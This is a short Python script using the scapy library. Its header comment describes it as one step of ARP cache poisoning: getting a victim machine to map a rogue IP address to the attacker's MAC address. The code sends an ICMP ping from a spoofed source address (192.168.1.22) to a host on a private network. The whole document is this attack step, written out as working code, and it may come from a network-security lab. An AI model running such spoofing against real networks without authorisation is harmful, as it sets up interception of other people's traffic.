#
# PURPOSE: To trigger the victim machine to send an ARP broadcast asking who is <spoofed_ip_addr> - to make the victim machine add a rogue IP address to its ARP table with the MAC address of the attacker machine
#

from scapy.all import *

ip=IP()
ip.src='192.168.1.22'
ip.dst='192.168.1.76'

icmp=ICMP()
icmp.type=8 # ping request

send(ip/icmp)



